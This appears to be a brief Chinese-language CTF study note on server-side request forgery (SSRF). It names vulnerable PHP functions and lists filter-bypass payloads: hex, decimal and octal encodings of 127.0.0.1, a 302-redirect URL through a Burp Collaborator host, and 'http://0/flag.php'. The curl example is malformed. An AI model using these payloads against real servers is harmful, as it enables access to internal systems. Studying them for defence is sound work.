# SSRF

SSRF (Server-Side Request Forgery，服务器端请求伪造) 是一种由攻击者构造请求，由服务端发起请求的安全漏洞，一般情况下，SSRF攻击的目标是外网无法访问的内网系统，也正因为请求是由服务端发起的，所以服务端能请求到与自身相连而与外网隔绝的内部系统。也就是说可以利用一个网络请求的服务，当作跳板进行攻击。


<br>


### PHP
在PHP中的curl()，file_get_contents()，fsockopen()等函数是几个主要产生ssrf漏洞的函数

* curl()

curl(127.0.0.1:flag.php)






### 绕过

各种进制的内网地址

````
#默认

http://127.0.0.1
#16进制

http://0x7F000001
#10进制

((127*256+0)*256+0)*256+1//计算过程
http://2130706433
#8进制

http://0177.0000.0000.0001
````

<br>

302跳转绕过
````
http://spoofed.burpcollaborator.net/flag.php
````

<br>

短绕过
````
linux中 0 指向本机地址

payload： url=http://0/flag.php
````
